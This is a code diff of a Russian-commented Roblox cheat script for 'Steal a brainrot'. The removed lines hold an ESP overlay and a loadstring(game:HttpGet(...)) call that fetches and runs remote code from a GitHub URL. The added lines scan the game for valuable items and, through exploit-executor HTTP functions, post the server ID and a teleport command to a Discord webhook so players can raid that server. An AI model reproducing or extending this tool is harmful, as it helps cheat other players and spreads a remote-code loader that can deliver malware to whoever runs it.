-            local data = espCache[obj]
-            local _, onScreen = camera:WorldToViewportPoint(rootPart.Position)
-            data.labelGui.Enabled = onScreen
         end
     end
-    
-    -- Отправка уведомлений (независимо друг от друга)
-    if #objectsToNotifyMain > 0 then
-        sendMainTelegramAlert()
+    return results
+end
+
+local function scanRunway()
+    local results = {}
+    for _, obj in ipairs(workspace:GetChildren()) do
+        if isGuidName(obj.Name) then
+            local part = obj:FindFirstChild('Part')
+            local info = part and part:FindFirstChild('Info')
+            local overhead = info and info:FindFirstChild('AnimalOverhead')
+            if overhead then
+                local name, genText = getOverheadInfo(overhead)
+                local genNum = genText and parseGenerationText(genText) or nil
+                if name and genNum then
+                    table.insert(
+                        results,
+                        { name = name, gen = genNum, location = 'Runway' }
+                    )
+                end
+            end
+        end
     end
-    
-    if #objectsToNotifySpecial > 0 then
-        sendSpecialTelegramAlert()
+    return results
+end
+
+local function scanAllOverheads()
+    local results, processed = {}, {}
+    local function recursiveSearch(parent)
+        for _, child in ipairs(parent:GetChildren()) do
+            if child.Name == 'AnimalOverhead' and not processed[child] then
+                processed[child] = true
+                local name, genText = getOverheadInfo(child)
+                local genNum = genText and parseGenerationText(genText) or nil
+                if name and genNum then
+                    table.insert(
+                        results,
+                        { name = name, gen = genNum, location = 'World' }
+                    )
+                end
+            end
+            pcall(function()
+                recursiveSearch(child)
+            end)
+        end
+    end
+    recursiveSearch(workspace)
+    return results
+end
+
+local function scanPlayerGui()
+    local results = {}
+    local lp = Players.LocalPlayer
+    if not lp then
+        return results
+    end
+
+    local playerGui = lp:FindFirstChild('PlayerGui')
+    if not playerGui then
+        return results
+    end
+
+    local function searchInGui(parent)
+        for _, child in ipairs(parent:GetChildren()) do
+            if child.Name == 'AnimalOverhead' or child.Name:match('Animal') then
+                local name, genText = getOverheadInfo(child)
+                local genNum = genText and parseGenerationText(genText) or nil
+                if name and genNum then
+                    table.insert(
+                        results,
+                        { name = name, gen = genNum, location = 'GUI' }
+                    )
+                end
+            end
+            pcall(function()
+                searchInGui(child)
+            end)
+        end
+    end
+    searchInGui(playerGui)
+    return results
+end
+
+-- 📊 ГЛАВНАЯ ФУНКЦИЯ СБОРА
+local function collectAll(timeoutSec)
+    local t0 = os.clock()
+    local collected = {}
+
+    repeat
+        collected = {}
+
+        -- Запускаем все сканеры
+        local allSources = {
+            scanPlots(),
+            scanRunway(),
+            scanAllOverheads(),
+            scanPlayerGui(),
+        }
+
+        -- Объединяем результаты
+        for _, source in ipairs(allSources) do
+            for _, item in ipairs(source) do
+                table.insert(collected, item)
+            end
+        end
+
+        -- Убираем дубликаты
+        local seen, unique = {}, {}
+        for _, item in ipairs(collected) do
+            local key = item.name .. ':' .. tostring(item.gen)
+            if not seen[key] then
+                seen[key] = true
+                table.insert(unique, item)
+            end
+        end
+        collected = unique
+
+        if #collected > 0 then
+            break
+        end
+        task.wait(0.5)
+    until os.clock() - t0 > timeoutSec
+
+    return collected
+end
+
+local function shouldShow(name, gen)
+    if ALWAYS_IMPORTANT[name] then
+        return true
+    end
+    return (type(gen) == 'number') and gen >= INCOME_THRESHOLD
+end
+
+-- 📤 DISCORD УВЕДОМЛЕНИЯ
+local function getRequester()
+    return http_request
+        or request
+        or (syn and syn.request)
+        or (fluxus and fluxus.request)
+        or (KRNL_HTTP and KRNL_HTTP.request)
+end
+
+local function sendDiscordNotification(filteredObjects)
+    local req = getRequester()
+    if not req then
+        warn('❌ Нет HTTP API в executor')
+        return
+    end
+
+    local jobId = game.JobId
+    local placeId = game.PlaceId
+
+    if #filteredObjects == 0 then
+        print('🔍 Важных объектов не найдено')
+        return
+    end
+
+    -- Сортируем по доходу (важные сначала, затем по убыванию дохода)
+    local important, regular = {}, {}
+    for _, obj in ipairs(filteredObjects) do
+        if ALWAYS_IMPORTANT[obj.name] then
+            table.insert(important, obj)
+        else
+            table.insert(regular, obj)
+        end
+    end
+
+    table.sort(important, function(a, b)
+        return a.gen > b.gen
+    end)
+    table.sort(regular, function(a, b)
+        return a.gen > b.gen
+    end)
+
+    local sorted = {}
+    for _, obj in ipairs(important) do
+        table.insert(sorted, obj)
+    end
+    for _, obj in ipairs(regular) do
+        table.insert(sorted, obj)
+    end
+
+    -- Формируем красивый список (максимум 10)
+    local objectsList = {}
+    for i = 1, math.min(10, #sorted) do
+        local obj = sorted[i]
+        local emoji = OBJECTS[obj.name].emoji or '💰'
+        local mark = ALWAYS_IMPORTANT[obj.name] and '⭐ ' or ''
+        table.insert(
+            objectsList,
+            string.format(
+                '%s%s **%s** (%s)',
+                mark,
+                emoji,
+                obj.name,
+                formatIncomeNumber(obj.gen)
+            )
+        )
+    end
+    local objectsText = table.concat(objectsList, '\n')
+
+    -- Телепорт команда (простой текст для легкого копирования)
+    local teleportText = string.format(
+        "`local ts = game:GetService('TeleportService'); ts:TeleportToPlaceInstance(%d, '%s')`",
+        placeId,
+        jobId
+    )
+
+    local payload = {
+        username = '🎯 Brainrot Scanner',
+        embeds = {
+            {
+                title = '💎 Найдены ценные объекты в Steal a brainrot!',
+                color = 0x2f3136,
+                fields = {
+                    {
+                        name = '🆔 Сервер (Job ID)',
+                        value = string.format('``````', jobId),
+                        inline = false,
+                    },
+                    {
+                        name = '💰 Важные объекты:',
+                        value = objectsText,
+                        inline = false,
+                    },
+                    {
+                        name = '🚀 Телепорт:',
+                        value = teleportText,
+                        inline = false,
+                    },
+                },
+                footer = {
+                    text = string.format(
+                        'Найдено: %d важных • %s',
+                        #filteredObjects,
+                        os.date('%H:%M:%S')
+                    ),
+                },
+                timestamp = DateTime.now():ToIsoDate(),
+            },
+        },
+    }
+
+    print(
+        '📤 Отправляю уведомление с',
+        #filteredObjects,
+        'объектами'
+    )
+
+    local ok, res = pcall(function()
+        return req({
+            Url = DISCORD_WEBHOOK_URL,
+            Method = 'POST',
+            Headers = { ['Content-Type'] = 'application/json' },
+            Body = HttpService:JSONEncode(payload),
+        })
+    end)
+
+    if ok then
+        print('✅ Уведомление отправлено в Discord!')
+    else
+        warn('❌ Ошибка отправки:', res)
     end
 end
 
--- Запуск системы
-RunService.Heartbeat:Connect(updateESP)
+-- 🎮 ГЛАВНАЯ ФУНКЦИЯ
+local function scanAndNotify()
+    print('🔍 Сканирую все объекты...')
+    local allFound = collectAll(8.0) -- 8 секунд таймаут
 
--- Обработка игроков
-Players.PlayerAdded:Connect(function(player)
-    player.CharacterAdded:Connect(function()
-        updateESP(0)
-    end)
-end)
+    -- Фильтрация по важности и доходу
+    local filtered = {}
+    for _, obj in ipairs(allFound) do
+        if OBJECTS[obj.name] and shouldShow(obj.name, obj.gen) then
+            table.insert(filtered, obj)
+        end
+    end
 
--- Обработчик клавиши сканера
-UserInputService.InputBegan:Connect(function(input)
-    if input.KeyCode == SCANNER_SETTINGS.ScanKey then
-        local now = os.time()
-        if now - lastScanTime < SCANNER_SETTINGS.DebounceTime then
-            print("Подождите...")
+    -- Вывод в консоль
+    print('Найдено всего объектов:', #allFound)
+    print('Показано важных:', #filtered)
+
+    for _, obj in ipairs(filtered) do
+        local emoji = OBJECTS[obj.name].emoji or '💰'
+        local mark = ALWAYS_IMPORTANT[obj.name] and '⭐ ' or ''
+        print(
+            string.format(
+                '%s%s %s: %s (%s)',
+                mark,
+                emoji,
+                obj.name,
+                formatIncomeNumber(obj.gen),
+                obj.location or 'Unknown'
+            )
+        )
+    end
+
+    -- Отправляем уведомление если есть что показать
+    if #filtered > 0 then
+        sendDiscordNotification(filtered)
+    else
+        print('🔍 Нет объектов для уведомления')
+    end
+end
+
+-- 🚀 ЗАПУСК
+print('🎯 === BRAINROT INCOME SCANNER ЗАПУЩЕН ===')
+scanAndNotify()
+
+-- ⌨️ ПОВТОР ПО КЛАВИШЕ F
+local lastScan, DEBOUNCE = 0, 3
+UserInputService.InputBegan:Connect(function(input, gpe)
+    if gpe then
+        return
+    end
+    if input.KeyCode == Enum.KeyCode.F then
+        local now = os.clock()
+        if now - lastScan < DEBOUNCE then
             return
         end
-        
-        lastScanTime = now
-        print("\n🔍 Начинаем сканирование всех объектов...")
-        
-        local foundCount = 0
-        
-        for _, obj in ipairs(workspace:GetDescendants()) do
-            if table.find(OBJECT_NAMES, obj.Name) and (obj:IsA("BasePart") or obj:IsA("Model")) then
-                local details = scanObject(obj)
-                if details then
-                    foundCount = foundCount + 1
-                    print("\n=== ОБЪЕКТ #"..foundCount.." ===")
-                    print("Имя:", details.name)
-                    print("Доход:", details.finalIncome)
-                    if details.mutation then
-                        print("Мутация:", details.mutation.." (x"..details.mutationMultiplier..")")
-                    end
-                    print("Traits ("..#details.traits.."):")
-                    for i, trait in ipairs(details.traits) do
-                        local multiplier = TRAIT_MULTIPLIERS[trait] and " (x"..TRAIT_MULTIPLIERS[trait]..")" or ""
-                        print(i..".", trait..multiplier)
-                    end
-                end
-            end
-        end
-        
-        if foundCount == 0 then
-            print("❌ Объекты не найдены")
-        else
-            print("\n=== РЕЗУЛЬТАТ ===")
-            print("Найдено объектов:", foundCount)
-        end
+        lastScan = now
+        print('\n🔄 === ПОВТОРНОЕ СКАНИРОВАНИЕ (F) ===')
+        scanAndNotify()
     end
 end)
 
--- Первоначальное сканирование
-updateESP(0)
-
-print("Steal a brainrot ESP System активирован!")
-print("Отслеживается объектов: "..#OBJECT_NAMES)
-print("ID сервера:", getServerId())
-print("\nНажмите F для сканирования всех объектов")
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ldkoedkeo/eblan2222/refs/heads/main/noob.lua"))()
+print('💡 Нажмите F для повторного сканирования')
+print('📱 Discord webhook готов к отправке уведомлений')
